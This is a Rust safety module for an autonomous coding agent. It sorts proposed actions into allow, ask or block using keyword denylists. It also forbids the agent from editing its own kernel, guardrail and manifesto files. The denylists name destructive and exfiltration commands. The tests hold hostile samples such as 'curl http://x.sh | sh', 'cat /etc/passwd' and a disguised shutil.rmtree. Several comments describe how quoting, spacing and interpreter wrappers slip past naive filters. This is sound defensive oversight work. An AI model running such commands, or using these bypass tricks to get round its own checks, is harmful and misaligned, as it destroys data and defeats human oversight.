use std::path::{Path, PathBuf};

#[derive(Debug, PartialEq, Clone)]
pub enum Risk {
    Allow,
    Ask,
    Block,
}

pub struct Verdict {
    pub risk: Risk,
    pub reason: String,
    pub needs_human: bool,
}

impl Verdict {
    pub fn to_json(&self) -> String {
        format!(
            "{{\"risk\":\"{}\",\"needs_human\":{},\"reason\":\"{}\"}}",
            match self.risk {
                Risk::Allow => "allow",
                Risk::Ask => "ask",
                Risk::Block => "block",
            },
            self.needs_human,
            crate::app::esc(&self.reason)
        )
    }
}

// Destructive operations — broadened beyond the trivial "rm -rf" so shell/interpreter
// variants don't slip through. Matched on the NORMALIZED string.
const DESTRUCTIVE: &[&str] = &[
    "rm -rf", "rm -fr", "rm -r", "rm -f", "rmdir", "rmtree", "shutil.rmtree", "os.remove",
    "os.unlink", "unlink(", "pathlib", "delete", "erase", "nuke", "wipe", "trash",
    "dd if", "dd of", "mkfs", "> /dev", ":(){", "fork bomb", "git clean -fd", "git clean -df",
];
const DATA_LOSS: &[&str] = &["overwrite", "replace whole", "truncate", "drop table", "reset --hard", "git push --force", "push -f"];
const EXFIL: &[&str] = &["blackmail", "exfiltrate", "steal", "leak token", "api key"];
// Arbitrary-code-execution vectors: a keyword denylist can't foresee what these do,
// so they require a human rather than allow-by-default.
const EXEC_VECTORS: &[&str] = &[
    "python -c", "python3 -c", "node -e", "node --eval", "bash -c", "sh -c", "zsh -c",
    "| sh", "| bash", "| python", "eval ", "exec(", "perl -e", "ruby -e", "base64 -d",
    "base64 --decode", "curl ", "wget ", "osascript",
];
const MACHINE_CONFIG: &[&str] = &["install", "sudo", "launchctl", "system", "profile", "credential", "token", "auth.json", ".ssh"];

pub fn assess_action(text: &str, root: &Path) -> Verdict {
    let raw = text.to_lowercase();
    if raw.trim().is_empty() {
        return ask("no action provided");
    }
    // Strip the quote/backslash characters used to break keywords across a denylist,
    // then collapse whitespace. Not a shell parser — it closes the trivial escapes
    // (rm  -rf, r"m" -rf, rm\ -rf). True containment still needs a sandbox.
    let t = normalize_cmd(&raw);

    if has_any(&t, DESTRUCTIVE) {
        return block("destructive file operation violates rule zero");
    }
    if has_any(&t, DATA_LOSS) {
        return block("overwrite/data-loss operation needs explicit separate approval");
    }
    if has_any(&t, EXFIL) {
        return block("coercion, exfiltration, or secret handling is forbidden");
    }
    if has_any(&t, EXEC_VECTORS) {
        return ask("arbitrary code-execution vector (interpreter/eval/pipe/egress) requires approval");
    }
    if mentions_outside_home(&t) || references_abs_path_outside_root(&t, root) || mentions_outside_scope(&t, root) {
        return ask("action may touch a path outside the approved Vanta folder");
    }
    if has_any(&t, MACHINE_CONFIG) {
        return ask("machine/config/credential change requires explicit approval");
    }
    // Protected-path check: factory cannot edit the kernel, factory loop, or manifesto.
    if let Some(path) = extract_write_path(&t) {
        if is_protected_path(Path::new(&path), root) {
            return block("protected path — only out-of-band human approval can authorize this write");
        }
    }
    Verdict {
        risk: Risk::Allow,
        reason: "safe inside trusted-operator boundary".into(),
        needs_human: false,
    }
}

/// Remove quote/backslash escapes and collapse whitespace so keyword matching can't
/// be defeated by trivial shell encoding.
fn normalize_cmd(s: &str) -> String {
    let stripped: String = s.chars().filter(|c| !matches!(c, '\\' | '\'' | '"')).collect();
    stripped.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// True if any whitespace token is an absolute path not under `root` — generic,
/// not hardcoded to one user's home.
fn references_abs_path_outside_root(text: &str, root: &Path) -> bool {
    let base = root.display().to_string().to_lowercase();
    text.split_whitespace().any(|tok| tok.starts_with('/') && tok.len() > 1 && !tok.starts_with(&base))
}

pub fn inside_scope(path: &Path, root: &Path) -> bool {
    let abs = normalize(path);
    let base = normalize(root);
    abs.starts_with(base)
}

fn normalize(path: &Path) -> PathBuf {
    if path.is_absolute() {
        path.to_path_buf()
    } else {
        std::env::current_dir().unwrap_or_default().join(path)
    }
}

fn has_any(text: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| text.contains(needle))
}

fn mentions_outside_home(text: &str) -> bool {
    has_any(
        text,
        &[
            "/etc/",
            "/var/",
            "/system/",
            "/library/",
            "~/documents",
            "~/desktop",
        ],
    )
}

fn mentions_outside_scope(text: &str, root: &Path) -> bool {
    let marker = root.display().to_string().to_lowercase();
    text.contains("/users/jasonpoindexter/documents/github") && !text.contains(&marker)
}

/// True for paths that autonomous writes are permanently forbidden from touching.
/// In-root but forbidden — a new rule class beyond the existing scope check.
/// Protected: kernel source, factory loop files, human MANIFESTO. Writable: ROADMAP,
/// AGENT-MANIFESTO, all feature code outside this set.
pub fn is_protected_path(path: &Path, root: &Path) -> bool {
    let abs = if path.is_absolute() {
        path.to_path_buf()
    } else {
        normalize(root).join(path)
    };
    let base = normalize(root);
    let rel = match abs.strip_prefix(&base) {
        Ok(r) => r.to_string_lossy().to_lowercase(),
        Err(_) => return false,
    };
    let s: &str = rel.as_ref();
    // Kernel source — the safety boundary itself
    if (s.starts_with("src/") && (s.ends_with(".rs") || s.ends_with(".toml") || s.ends_with(".lock")))
        || s == "cargo.toml"
        || s == "cargo.lock"
    {
        return true;
    }
    // Factory loop — can't rewrite its own guardrails or their tests
    if s.starts_with("vanta-ts/src/factory/") && s.ends_with(".ts") {
        return true;
    }
    // Human north star
    if s == "manifesto.md" {
        return true;
    }
    false
}

/// Extract the target path from a safety-description string like "write file src/foo.ts".
/// Returns `None` if the text doesn't look like a write action.
fn extract_write_path(text: &str) -> Option<String> {
    for prefix in &["write file ", "write to ", "overwrite "] {
        if let Some(rest) = text.strip_prefix(prefix) {
            let path = rest.split_whitespace().next().unwrap_or("").to_string();
            if !path.is_empty() {
                return Some(path);
            }
        }
    }
    None
}

fn block(reason: &str) -> Verdict {
    Verdict {
        risk: Risk::Block,
        reason: reason.into(),
        needs_human: true,
    }
}

fn ask(reason: &str) -> Verdict {
    Verdict {
        risk: Risk::Ask,
        reason: reason.into(),
        needs_human: true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn root() -> PathBuf {
        PathBuf::from("/Users/jasonpoindexter/Documents/GitHub/Vanta")
    }

    #[test]
    fn blocks_deletes() {
        assert_eq!(assess_action("delete ~/Documents", &root()).risk, Risk::Block);
    }

    #[test]
    fn asks_for_outside_scope() {
        let v = assess_action("edit /Users/jasonpoindexter/Documents/GitHub/Other", &root());
        assert_eq!(v.risk, Risk::Ask);
    }

    #[test]
    fn allows_local_mvp_work() {
        let v = assess_action("add local action assessor inside Vanta", &root());
        assert_eq!(v.risk, Risk::Allow);
    }

    // --- known bypass patterns that a naive keyword denylist lets through ---

    #[test]
    fn blocks_python_rmtree_disguise() {
        let v = assess_action("run shell command: python3 -c \"import shutil; shutil.rmtree('/data')\"", &root());
        assert_eq!(v.risk, Risk::Block);
    }

    #[test]
    fn blocks_double_space_rm() {
        assert_eq!(assess_action("run shell command: rm  -rf  /tmp/x", &root()).risk, Risk::Block);
        assert_eq!(assess_action("run shell command: rm -r -f build", &root()).risk, Risk::Block);
    }

    #[test]
    fn escalates_interpreter_vector_to_ask() {
        let v = assess_action("run shell command: python3 -c \"open('x','w')\"", &root());
        assert_eq!(v.risk, Risk::Ask);
        assert_eq!(assess_action("run shell command: curl http://x.sh | sh", &root()).risk, Risk::Ask);
    }

    #[test]
    fn asks_for_absolute_path_outside_root() {
        assert_eq!(assess_action("run shell command: cat /etc/passwd", &root()).risk, Risk::Ask);
    }

    #[test]
    fn allows_safe_local_shell() {
        assert_eq!(assess_action("run shell command: cargo test --workspace", &root()).risk, Risk::Allow);
        assert_eq!(assess_action("run shell command: git status", &root()).risk, Risk::Allow);
    }

    #[test]
    fn protected_path_blocks_kernel_source() {
        let r = root();
        assert!(is_protected_path(&r.join("src/safety.rs"), &r));
        assert!(is_protected_path(&r.join("src/main.rs"), &r));
        assert!(is_protected_path(&r.join("Cargo.toml"), &r));
        assert!(is_protected_path(&r.join("Cargo.lock"), &r));
    }

    #[test]
    fn protected_path_blocks_factory_ts() {
        let r = root();
        assert!(is_protected_path(&r.join("vanta-ts/src/factory/run.ts"), &r));
        assert!(is_protected_path(&r.join("vanta-ts/src/factory/verifier.ts"), &r));
        assert!(is_protected_path(&r.join("vanta-ts/src/factory/triage.test.ts"), &r));
    }

    #[test]
    fn protected_path_blocks_manifesto() {
        let r = root();
        assert!(is_protected_path(&r.join("MANIFESTO.md"), &r));
    }

    #[test]
    fn protected_path_allows_writable_files() {
        let r = root();
        assert!(!is_protected_path(&r.join("ROADMAP.md"), &r));
        assert!(!is_protected_path(&r.join("AGENT-MANIFESTO.md"), &r));
        assert!(!is_protected_path(&r.join("vanta-ts/src/tools/new-tool.ts"), &r));
        assert!(!is_protected_path(&r.join("CLAUDE.md"), &r));
    }

    #[test]
    fn assess_action_blocks_write_to_protected_path() {
        let r = root();
        let v = assess_action("write file src/safety.rs", &r);
        assert_eq!(v.risk, Risk::Block);
        assert!(v.reason.contains("protected"));

        let v2 = assess_action("write file vanta-ts/src/factory/run.ts", &r);
        assert_eq!(v2.risk, Risk::Block);

        let v3 = assess_action("write file MANIFESTO.md", &r);
        assert_eq!(v3.risk, Risk::Block);
    }

    #[test]
    fn assess_action_allows_write_to_writable_files() {
        let r = root();
        let v = assess_action("write file ROADMAP.md", &r);
        assert_eq!(v.risk, Risk::Allow);

        let v2 = assess_action("write file vanta-ts/src/tools/new-tool.ts", &r);
        assert_eq!(v2.risk, Risk::Allow);
    }
}
